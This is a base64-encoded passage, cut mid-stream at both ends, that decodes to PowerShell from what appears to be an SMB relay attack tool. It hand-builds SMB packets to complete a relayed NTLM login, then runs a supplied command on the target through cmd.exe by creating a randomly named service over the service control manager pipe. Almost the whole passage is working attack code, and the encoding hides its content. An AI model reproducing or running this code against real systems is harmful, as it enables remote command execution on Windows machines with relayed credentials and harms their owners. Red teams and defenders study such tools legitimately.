CAgICArICgweDAwLDB4MDAsMHgwYywweGZmLDB4MDAsMHgwMCwweDAwLDB4ZmYsMHhmZiwweDAyLDB4MDAsMHgwMSwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDApYAogICAgICAgICAgICAgICAgKyAkU01CX2Jsb2JfbGVuZ3RoYAogICAgICAgICAgICAgICAgKyAoMHgwMCwweDAwLDB4MDAsMHgwMCwweDQ0LDB4MDAsMHgwMCwweDgwKWAKICAgICAgICAgICAgICAgICsgJFNNQl9ieXRlX2NvdW50YAogICAgICAgICAgICAgICAgKyAoMHhhMSwweDgyKWAKICAgICAgICAgICAgICAgICsgJFNNQl9sZW5ndGhfMWAKICAgICAgICAgICAgICAgICsgKDB4MzAsMHg4MilgCiAgICAgICAgICAgICAgICArICRTTUJfbGVuZ3RoXzJgCiAgICAgICAgICAgICAgICArICgweGEyLDB4ODIpYAogICAgICAgICAgICAgICAgKyAkU01CX2xlbmd0aF8zYAogICAgICAgICAgICAgICAgKyAoMHgwNCwweDgyKWAKICAgICAgICAgICAgICAgICsgJFNNQl9OVExNU1NQX2xlbmd0aGAKICAgICAgICAgICAgICAgICsgJEhUVFBfcmVxdWVzdF9ieXRlc2AKICAgICAgICAgICAgICAgICsgKDB4NTUsMHg2ZSwweDY5LDB4NzgsMHgwMCwweDUzLDB4NjEsMHg2ZCwweDYyLDB4NjEsMHgwMCkKCiAgICAgICAgICAgICRTTUJfcmVsYXlfcmVzcG9uc2Vfc3RyZWFtLndyaXRlKCRTTUJfcmVsYXlfcmVzcG9uc2Vfc2VuZCwgMCwgJFNNQl9yZWxheV9yZXNwb25zZV9zZW5kLmxlbmd0aCkKICAgICAgICAJJFNNQl9yZWxheV9yZXNwb25zZV9zdHJlYW0uRmx1c2goKQogICAgICAgICAgICAKICAgICAgICAgICAgaWYoJFNNQlJlbGF5TmV0d29ya1RpbWVvdXQpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfcmVzcG9uc2VfdGltZW91dCA9IG5ldy10aW1lc3BhbiAtU2Vjb25kcyAkU01CUmVsYXlOZXR3b3JrVGltZW91dAogICAgICAgICAgICAgICAgJFNNQl9yZWxheV9yZXNwb25zZV9zdG9wd2F0Y2ggPSBbZGlhZ25vc3RpY3Muc3RvcHdhdGNoXTo6U3RhcnROZXcoKQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgd2hpbGUoISRTTUJfcmVsYXlfcmVzcG9uc2Vfc3RyZWFtLkRhdGFBdmFpbGFibGUpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgaWYoJFNNQl9yZWxheV9yZXNwb25zZV9zdG9wd2F0Y2guZWxhcHNlZCAtZ2UgJFNNQl9yZWxheV9yZXNwb25zZV90aW1lb3V0KQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5hZGQoIlNNQiByZWxheSB0YXJnZXQgZGlkbid0IHJlc3BvbmQgd2l0aGluICRTTUJSZWxheU5ldHdvcmtUaW1lb3V0IHNlY29uZHMiKQogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2cuYWRkKCRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlWyRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlLmFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBTTUIgcmVsYXkgdGFyZ2V0IGRpZG4ndCByZXNwb25kIHdpdGhpbiAkU01CUmVsYXlOZXR3b3JrVGltZW91dCBzZWNvbmRzIildKQogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5TTUJfcmVsYXlfYWN0aXZlX3N0ZXAgPSAwCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfc29ja2V0LkNsb3NlKCkKICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsgOlNNQl9yZWxheV9yZXNwb25zZV9sb29wCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CgogICAgICAgICAgICAkU01CX3JlbGF5X3Jlc3BvbnNlX3N0cmVhbS5SZWFkKCRTTUJfcmVsYXlfcmVzcG9uc2VfYnl0ZXMsIDAsICRTTUJfcmVsYXlfcmVzcG9uc2VfYnl0ZXMubGVuZ3RoKQogICAgICAgICAgICAKICAgICAgICAgICAgJGludmVpZ2guU01CX3JlbGF5X2FjdGl2ZV9zdGVwID0gMgogICAgICAgICAgICAKICAgICAgICAgICAgJGorKwogICAgICAgIAogICAgICAgIH0KICAgICAgICByZXR1cm4gJFNNQl9yZWxheV9yZXNwb25zZV9ieXRlcwogICAgfQp9CgojIFNNQiBSZWxheSBFeGVjdXRlIFNjcmlwdEJsb2NrIC0gZXhlY3V0ZXMgY29tbWFuZCB3aXRoaW4gYXV0aGVudGljYXRlZCBTTUIgc2Vzc2lvbgokU01CX3JlbGF5X2V4ZWN1dGVfc2NyaXB0YmxvY2sgPQp7CiAgICBGdW5jdGlvbiBTTUJSZWxheUV4ZWN1dGUKICAgIHsKICAgICAgICBwYXJhbSAoJFNNQl9yZWxheV9zb2NrZXQsJFNNQl91c2VyX0lEKQogICAgCiAgICAgICAgaWYgKCRTTUJfcmVsYXlfc29ja2V0KQogICAgICAgIHsKICAgICAgICAgICAgJFNNQl9yZWxheV9leGVjdXRlX3N0cmVhbSA9ICRTTUJfcmVsYXlfc29ja2V0LkdldFN0cmVhbSgpCiAgICAgICAgfQoKICAgICAgICAkU01CX3JlbGF5X2ZhaWxlZCA9ICRmYWxzZQogICAgICAgICRTTUJfcmVsYXlfZXhlY3V0ZV9ieXRlcyA9IE5ldy1PYmplY3QgU3lzdGVtLkJ5dGVbXSAxMDI0CiAgICAgICAgJFNNQl9zZXJ2aWNlX3JhbmRvbSA9IFtTdHJpbmddOjpKb2luKCIwMC0iLCAoMS4uMjAgfCBGb3JFYWNoLU9iamVjdCB7InswOlgyfS0iIC1mIChHZXQtUmFuZG9tIC1NaW5pbXVtIDY1IC1NYXhpbXVtIDkwKX0pKQogICAgICAgICRTTUJfc2VydmljZSA9ICRTTUJfc2VydmljZV9yYW5kb20gLXJlcGxhY2UgIi0wMCIsIiIKICAgICAgICAkU01CX3NlcnZpY2UgPSAkU01CX3NlcnZpY2UuU3Vic3RyaW5nKDAsJFNNQl9zZXJ2aWNlLkxlbmd0aC0xKQogICAgICAgICRTTUJfc2VydmljZSA9ICRTTUJfc2VydmljZS5TcGxpdCgiLSIpIHwgRk9SRUFDSHsgW0NIQVJdW0NPTlZFUlRdOjp0b2ludDE2KCRfLDE2KX0KICAgICAgICAkU01CX3NlcnZpY2UgPSBOZXctT2JqZWN0IFN5c3RlbS5TdHJpbmcgKCRTTUJfc2VydmljZSwwLCRTTUJfc2VydmljZS5MZW5ndGgpCiAgICAgICAgJFNNQl9zZXJ2aWNlX3JhbmRvbSArPSAnMDAtMDAtMDAnCiAgICAgICAgW0J5dGVbXV0kU01CX3NlcnZpY2VfYnl0ZXMgPSAkU01CX3NlcnZpY2VfcmFuZG9tLlNwbGl0KCItIikgfCBGT1JFQUNIeyBbQ0hBUl1bQ09OVkVSVF06OnRvaW50MTYoJF8sMTYpfQogICAgICAgICRTTUJfcmVmZXJlbnRfSURfYnl0ZXMgPSBbU3RyaW5nXSgxLi40IHwgRm9yRWFjaC1PYmplY3QgeyJ7MDpYMn0iIC1mIChHZXQtUmFuZG9tIC1NaW5pbXVtIDEgLU1heGltdW0gMjU1KX0pCiAgICAgICAgJFNNQl9yZWZlcmVudF9JRF9ieXRlcyA9ICRTTUJfcmVmZXJlbnRfSURfYnl0ZXMuU3BsaXQoIiAiKSB8IEZPUkVBQ0h7IFtDSEFSXVtDT05WRVJUXTo6dG9pbnQxNigkXywxNil9CiAgICAgICAgJFNNQlJlbGF5Q29tbWFuZCA9ICIlQ09NU1BFQyUgL0MgYCIiICsgJFNNQlJlbGF5Q29tbWFuZCArICJgIiIKICAgICAgICBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCRTTUJSZWxheUNvbW1hbmQpIHwgRm9yRWFjaC1PYmplY3QgeyAkU01CX3JlbGF5X2NvbW1hbmQgKz0gInswOlgyfS0wMC0iIC1mICRfIH0KCiAgICAgICAgaWYoW2Jvb2xdKCRTTUJSZWxheUNvbW1hbmQubGVuZ3RoJTIpKQogICAgICAgIHsKICAgICAgICAgICAgJFNNQl9yZWxheV9jb21tYW5kICs9ICcwMC0wMCcKICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAgJFNNQl9yZWxheV9jb21tYW5kICs9ICcwMC0wMC0wMC0wMCcKICAgICAgICB9ICAgIAogICAgICAgIAogICAgICAgIFtCeXRlW11dJFNNQl9yZWxheV9jb21tYW5kX2J5dGVzID0gJFNNQl9yZWxheV9jb21tYW5kLlNwbGl0KCItIikgfCBGT1JFQUNIeyBbQ0hBUl1bQ09OVkVSVF06OnRvaW50MTYoJF8sMTYpfQogICAgICAgICRTTUJfc2VydmljZV9kYXRhX2xlbmd0aF9ieXRlcyA9IFtCaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkU01CX3JlbGF5X2NvbW1hbmRfYnl0ZXMubGVuZ3RoICsgJFNNQl9zZXJ2aWNlX2J5dGVzLmxlbmd0aCArIDIzNykKICAgICAgICAkU01CX3NlcnZpY2VfZGF0YV9sZW5ndGhfYnl0ZXMgPSAkU01CX3NlcnZpY2VfZGF0YV9sZW5ndGhfYnl0ZXNbMi4uMF0KICAgICAgICAkU01CX3NlcnZpY2VfYnl0ZV9jb3VudF9ieXRlcyA9IFtCaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkU01CX3JlbGF5X2NvbW1hbmRfYnl0ZXMubGVuZ3RoICsgJFNNQl9zZXJ2aWNlX2J5dGVzLmxlbmd0aCArIDIzNyAtIDYzKQogICAgICAgICRTTUJfc2VydmljZV9ieXRlX2NvdW50X2J5dGVzID0gJFNNQl9zZXJ2aWNlX2J5dGVfY291bnRfYnl0ZXNbMC4uMV0gICAKICAgICAgICAkU01CX3JlbGF5X2NvbW1hbmRfbGVuZ3RoX2J5dGVzID0gW0JpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRTTUJfcmVsYXlfY29tbWFuZF9ieXRlcy5sZW5ndGggLyAyKQoKICAgICAgICAkayA9IDAKCiAgICAgICAgOlNNQl9yZWxheV9leGVjdXRlX2xvb3Agd2hpbGUgKCRrIC1sdCAxMikKICAgICAgICB7CiAgICAgICAgICAgIHN3aXRjaCAoJGspCiAgICAgICAgICAgIHsKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAwIHsKICAgICAgICAgICAgICAgICAgICBbQnl0ZVtdXSRTTUJfcmVsYXlfZXhlY3V0ZV9zZW5kID0gKDB4MDAsMHgwMCwweDAwLDB4NDUsMHhmZiwweDUzLDB4NGQsMHg0MiwweDc1LDB4MDAsMHgwMCwweDAwLDB4MDAsMHgxOCwweDAxLDB4NDgpYAogICAgICAgICAgICAgICAgICAgICAgICArICgweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweGZmLDB4ZmYpYAogICAgICAgICAgICAgICAgICAgICAgICArICRpbnZlaWdoLnByb2Nlc3NfSURfYnl0ZXNgCiAgICAgICAgICAgICAgICAgICAgICAgICsgJFNNQl91c2VyX0lEYAogICAgICAgICAgICAgICAgICAgICAgICArICgweDAwLDB4MDAsMHgwNCwweGZmLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAxLDB4MDAsMHgxYSwweDAwLDB4MDAsMHg1YywweDVjLDB4MzEsMHgzMCwweDJlLDB4MzEpYAogICAgICAgICAgICAgICAgICAgICAgICArICgweDMwLDB4MmUsMHgzMiwweDJlLDB4MzEsMHgzMCwweDMyLDB4NWMsMHg0OSwweDUwLDB4NDMsMHgyNCwweDAwLDB4M2YsMHgzZiwweDNmLDB4M2YsMHgzZiwweDAwKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIDEgewogICAgICAgICAgICAgICAgICAgIFtCeXRlW11dJFNNQl9yZWxheV9leGVjdXRlX3NlbmQgPSAoMHgwMCwweDAwLDB4MDAsMHg1YiwweGZmLDB4NTMsMHg0ZCwweDQyLDB4YTIsMHgwMCwweDAwLDB4MDAsMHgwMCwweDE4LDB4MDIsMHgyOClgCiAgICAgICAgICAgICAgICAgICAgICAgICsgKDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwOClgCiAgICAgICAgICAgICAgICAgICAgICAgICsgJGludmVpZ2gucHJvY2Vzc19JRF9ieXRlc2AKICAgICAgICAgICAgICAgICAgICAgICAgKyAkU01CX3VzZXJfSURgCiAgICAgICAgICAgICAgICAgICAgICAgICsgKDB4MDMsMHgwMCwweDE4LDB4ZmYsMHgwMCwweDAwLDB4MDAsMHgwMCwweDA3LDB4MDAsMHgxNiwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwKWAKICAgICAgICAgICAgICAgICAgICAgICAgKyAoMHgwMiwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDA3LDB4MDAsMHgwMCwweDAwLDB4MDEsMHgwMCwweDAwLDB4MDApYAogICAgICAgICAgICAgICAgICAgICAgICArICgweDAwLDB4MDAsMHgwMCwweDAwLDB4MDIsMHgwMCwweDAwLDB4MDAsMHgwMCwweDA4LDB4MDAsMHg1YywweDczLDB4NzYsMHg2MywweDYzLDB4NzQsMHg2YywweDAwKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAyIHsKICAgICAgICAgICAgICAgICAgICBbQnl0ZVtdXSRTTUJfcmVsYXlfZXhlY3V0ZV9zZW5kID0gKDB4MDAsMHgwMCwweDAwLDB4ODcsMHhmZiwweDUzLDB4NGQsMHg0MiwweDJmLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgxOCwweDA1LDB4MjgpYAogICAgICAgICAgICAgICAgICAgICAgICArICgweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDgpYAogICAgICAgICAgICAgICAgICAgICAgICArICRpbnZlaWdoLnByb2Nlc3NfSURfYnl0ZXNgCiAgICAgICAgICAgICAgICAgICAgICAgICsgJFNNQl91c2VyX0lEYAogICAgICAgICAgICAgICAgICAgICAgICArICgweDA0LDB4MDAsMHgwZSwweGZmLDB4MDAsMHgwMCwweDAwLDB4MDAsMHg0MCwweGVhLDB4MDMsMHgwMCwweDAwLDB4ZmYsMHhmZiwweGZmLDB4ZmYsMHgwOCwweDAwLDB4NDgsMHgwMClgCiAgICAgICAgICAgICAgICAgICAgICAgICsgKDB4MDAsMHgwMCwweDQ4LDB4MDAsMHgzZiwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHg0OCwweDAwLDB4MDUsMHgwMCwweDBiLDB4MDMsMHgxMCwweDAwLDB4MDAsMHgwMCwweDQ4KWAKICAgICAgICAgICAgICAgICAgICAgICAgKyAoMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweGQwLDB4MTYsMHhkMCwweDE2LDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMSwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDApYAogICAgICAgICAgICAgICAgICAgICAgICArICgweDAxLDB4MDAsMHg4MSwweGJiLDB4N2EsMHgzNiwweDQ0LDB4OTgsMHhmMSwweDM1LDB4YWQsMHgzMiwweDk4LDB4ZjAsMHgzOCwweDAwLDB4MTAsMHgwMywweDAyLDB4MDAsMHgwMClgCiAgICAgICAgICAgICAgICAgICAgICAgICsgKDB4MDAsMHgwNCwweDVkLDB4ODgsMHg4YSwweGViLDB4MWMsMHhjOSwweDExLDB4OWYsMHhlOCwweDA4LDB4MDAsMHgyYiwweDEwLDB4NDgsMHg2MCwweDAyLDB4MDAsMHgwMCwweDAwKQogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9tdWx0aXBsZXhfaWQgPSAoMHgwNSkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAzIHsgCiAgICAgICAgICAgICAgICAgICAgW0J5dGVbXV0kU01CX3JlbGF5X2V4ZWN1dGVfc2VuZCA9ICRTTUJfcmVsYXlfZXhlY3V0ZV9SZWFkQW5kUmVxdWVzdAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICA0IHsKICAgICAgICAgICAgICAgICAgICBbQnl0ZVtdXSAkU01CX3JlbGF5X2V4ZWN1dGVfc2VuZCA9ICgweDAwLDB4MDAsMHgwMCwweDliLDB4ZmYsMHg1MywweDRkLDB4NDIsMHgyZiwweDAwLDB4MDAsMHgwMCwweDAwLDB4MTgsMHgwNSwweDI4KWAKICAgICAgICAgICAgICAgICAgICAgICAgKyAoMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDA4KWAKICAgICAgICAgICAgICAgICAgICAgICAgKyAkaW52ZWlnaC5wcm9jZXNzX0lEX2J5dGVzYAogICAgICAgICAgICAgICAgICAgICAgICArICRTTUJfdXNlcl9JRGAKICAgICAgICAgICAgICAgICAgICAgICAgKyAoMHgwNiwweDAwLDB4MGUsMHhmZiwweDAwLDB4MDAsMHgwMCwweDAwLDB4NDAsMHhlYSwweDAzLDB4MDAsMHgwMCwweGZmLDB4ZmYsMHhmZiwweGZmLDB4MDgsMHgwMCwweDUwKWAKICAgICAgICAgICAgICAgICAgICAgICAgKyAoMHgwMCwweDAwLDB4MDAsMHg1YywweDAwLDB4M2YsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4NWMsMHgwMCwweDA1LDB4MDAsMHgwMCwweDAzLDB4MTAsMHgwMCwweDAwKWAKICAgICAgICAgICAgICAgICAgICAgICAgKyAoMHgwMCwweDVjLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgzOCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwZiwweDAwLDB4MDAsMHgwMCwweDAzKWAKICAgICAgICAgICAgICAgICAgICAgICAgKyAoMHgwMCwweDE1LDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgxNSwweDAwLDB4MDAsMHgwMClgCiAgICAgICAgICAgICAgICAgICAgICAgICsgJFNNQl9zZXJ2aWNlX2J5dGVzYAogICAgICAgICAgICAgICAgICAgICAgICArICgweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDNmLDB4MDAsMHgwZiwweDAwKQogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9tdWx0aXBsZXhfaWQgPSAoMHgwNykKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgNSB7ICAKICAgICAgICAgICAgICAgICAgICBbQnl0ZVtdXSRTTUJfcmVsYXlfZXhlY3V0ZV9zZW5kID0gJFNNQl9yZWxheV9leGVjdXRlX1JlYWRBbmRSZXF1ZXN0CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIDYgewogICAgICAgICAgICAgICAgICAgIFtCeXRlW11dJFNNQl9yZWxheV9leGVjdXRlX3NlbmQgPSBbQVJSQVldKDB4MDApYAogICAgICAgICAgICAgICAgICAgICAgICArICRTTUJfc2VydmljZV9kYXRhX2xlbmd0aF9ieXRlc2AKICAgICAgICAgICAgICAgICAgICAgICAgKyAoMHhmZiwweDUzLDB4NGQsMHg0MiwweDJmLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgxOCwweDA1LDB4MjgpYAogICAgICAgICAgICAgICAgICAgICAgICArICgweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDgpYAogICAgICAgICAgICAgICAgICAgICAgICArICRpbnZlaWdoLnByb2Nlc3NfSURfYnl0ZXNgCiAgICAgICAgICAgICAgICAgICAgICAgICsgJFNNQl91c2VyX0lEYAogICAgICAgICAgICAgICAgICAgICAgICArICgweDA4LDB4MDAsMHgwZSwweGZmLDB4MDAsMHgwMCwweDAwLDB4MDAsMHg0MCwweDAwLDB4MDAsMHgwMCwweDAwLDB4ZmYsMHhmZiwweGZmLDB4ZmYsMHgwOCwweDAwKWAKICAgICAgICAgICAgICAgICAgICAgICAgKyAkU01CX3NlcnZpY2VfYnl0ZV9jb3VudF9ieXRlc2AKICAgICAgICAgICAgICAgICAgICAgICAgKyAoMHgwMCwweDAwKWAKICAgICAgICAgICAgICAgICAgICAgICAgKyAkU01CX3NlcnZpY2VfYnl0ZV9jb3VudF9ieXRlc2AKICAgICAgICAgICAgICAgICAgICAgICAgKyAoMHgzZiwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDApYAogICAgICAgICAgICAgICAgICAgICAgICArICRTTUJfc2VydmljZV9ieXRlX2NvdW50X2J5dGVzYAogICAgICAgICAgICAgICAgICAgICAgICArICgweDA1LDB4MDAsMHgwMCwweDAzLDB4MTApYAogICAgICAgICAgICAgICAgICAgICAgICArICgweDAwLDB4MDAsMHgwMClgCiAgICAgICAgICAgICAgICAgICAgICAgICsgJFNNQl9zZXJ2aWNlX2J5dGVfY291bnRfYnl0ZXNgCiAgICAgICAgICAgICAgICAgICAgICAgICsgKDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MGMsMHgwMClgCiAgICAgICAgICAgICAgICAgICAgICAgICsgJFNNQl9jb250ZXh0X2hhbmRsZXJgCiAgICAgICAgICAgICAgICAgICAgICAgICsgKDB4MTUsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDE1LDB4MDAsMHgwMCwweDAwKWAKICAgICAgICAgICAgICAgICAgICAgICAgKyAkU01CX3NlcnZpY2VfYnl0ZXNgCiAgICAgICAgICAgICAgICAgICAgICAgICsgKDB4MDAsMHgwMClgCiAgICAgICAgICAgICAgICAgICAgICAgICsgJFNNQl9yZWZlcmVudF9JRF9ieXRlc2AKICAgICAgICAgICAgICAgICAgICAgICAgKyAoMHgxNSwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MTUsMHgwMCwweDAwLDB4MDApYAogICAgICAgICAgICAgICAgICAgICAgICArICRTTUJfc2VydmljZV9ieXRlc2AKICAgICAgICAgICAgICAgICAgICAgICAgKyAoMHgwMCwweDAwLDB4ZmYsMHgwMSwweDBmLDB4MDAsMHgxMCwweDAxLDB4MDAsMHgwMCwweDAzLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDApYAogICAgICAgICAgICAgICAgICAgICAgICArICRTTUJfcmVsYXlfY29tbWFuZF9sZW5ndGhfYnl0ZXNgCiAgICAgICAgICAgICAgICAgICAgICAgICsgKDB4MDAsMHgwMCwweDAwLDB4MDApYAogICAgICAgICAgICAgICAgICAgICAgICArICRTTUJfcmVsYXlfY29tbWFuZF9sZW5ndGhfYnl0ZXNgCiAgICAgICAgICAgICAgICAgICAgICAgICsgJFNNQl9yZWxheV9jb21tYW5kX2J5dGVzYAogICAgICAgICAgICAgICAgICAgICAgICArICgweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDApYAogICAgICAgICAgICAgICAgICAgICAgICArICgweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDApCiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAkU01CX211bHRpcGxleF9pZCA9ICgweDA5KQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIDcgewogICAgICAgICAgICAgICAgICAgIFtCeXRlW11dJFNNQl9yZWxheV9leGVjdXRlX3NlbmQgPSAkU01CX3JlbGF5X2V4ZWN1dGVfUmVhZEFuZFJlcXVlc3QKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIDggewogICAgICAgICAgICAgICAgICAgIFtCeXRlW11dJFNNQl9yZWxheV9leGVjdXRlX3NlbmQgPSAoMHgwMCwweDAwLDB4MDAsMHg3MywweGZmLDB4NTMsMHg0ZCwweDQyLDB4MmYsMHgwMCwweDAwLDB4MDAsMHgwMCwweDE4LDB4MDUsMHgyOClgCiAgICAgICAgICAgICAgICAgICAgICAgICsgKDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwOClgCiAgICAgICAgICAgICAgICAgICAgICAgICsgJGludmVpZ2gucHJvY2Vzc19JRF9ieXRlc2AKICAgICAgICAgICAgICAgICAgICAgICAgKyAkU01CX3VzZXJfSURgCiAgICAgICAgICAgICAgICAgICAgICAgICsgKDB4MGEsMHgwMCwweDBlLDB4ZmYsMHgwMCwweDAwLDB4MDAsMHgwMCwweDQwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHhmZiwweGZmLDB4ZmYsMHhmZiwweDA4LDB4MDAsMHgzNClgCiAgICAgICAgICAgICAgICAgICAgICAgICsgKDB4MDAsMHgwMCwweDAwLDB4MzQsMHgwMCwweDNmLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDM0LDB4MDAsMHgwNSwweDAwLDB4MDAsMHgwMywweDEwLDB4MDAsMHgwMClgCiAgICAgICAgICAgICAgICAgICAgICAgICsgKDB4MDAsMHgzNCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MWMsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MTMsMHgwMClgCiAgICAgICAgICAgICAgICAgICAgICAgICsgJFNNQl9jb250ZXh0X2hhbmRsZXJgCiAgICAgICAgICAgICAgICAgICAgICAgICsgKDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgOSB7CiAgICAgICAgICAgICAgICAgICAgW0J5dGVbXV0kU01CX3JlbGF5X2V4ZWN1dGVfc2VuZCA9ICRTTUJfcmVsYXlfZXhlY3V0ZV9SZWFkQW5kUmVxdWVzdAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAxMCB7IAogICAgICAgICAgICAgICAgICAgIFtCeXRlW11dJFNNQl9yZWxheV9leGVjdXRlX3NlbmQgPSAoMHgwMCwweDAwLDB4MDAsMHg2YiwweGZmLDB4NTMsMHg0ZCwweDQyLDB4MmYsMHgwMCwweDAwLDB4MDAsMHgwMCwweDE4LDB4MDUsMHgyOClgCiAgICAgICAgICAgICAgICAgICAgICAgICsgKDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwOClgCiAgICAgICAgICAgICAgICAgICAgICAgICsgJGludmVpZ2gucHJvY2Vzc19JRF9ieXRlc2AKICAgICAgICAgICAgICAgICAgICAgICAgKyAkU01CX3VzZXJfSURgCiAgICAgICAgICAgICAgICAgICAgICAgICsgKDB4MGIsMHgwMCwweDBlLDB4ZmYsMHgwMCwweDAwLDB4MDAsMHgwMCwweDQwLDB4MGIsMHgwMSwweDAwLDB4MDAsMHhmZiwweGZmLDB4ZmYsMHhmZiwweDA4LDB4MDAsMHgyYylgCiAgICAgICAgICAgICAgICAgICAgICAgICsgKDB4MDAsMHgwMCwweDAwLDB4MmMsMHgwMCwweDNmLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDJjLDB4MDAsMHgwNSwweDAwLDB4MDAsMHgwMywweDEwLDB4MDAsMHgwMClgCiAgICAgICAgICAgICAgICAgICAgICAgICsgKDB4MDAsMHgyYywweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MTQsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDIsMHgwMClgCiAgICAgICAgICAgICAgICAgICAgICAgICsgJFNNQl9jb250ZXh0X2hhbmRsZXIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIDExIHsKICAgICAgICAgICAgICAgICAgICBbQnl0ZVtdXSRTTUJfcmVsYXlfZXhlY3V0ZV9zZW5kID0gJFNNQl9yZWxheV9leGVjdXRlX1JlYWRBbmRSZXF1ZXN0CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgICRTTUJfcmVsYXlfZXhlY3V0ZV9zdHJlYW0ud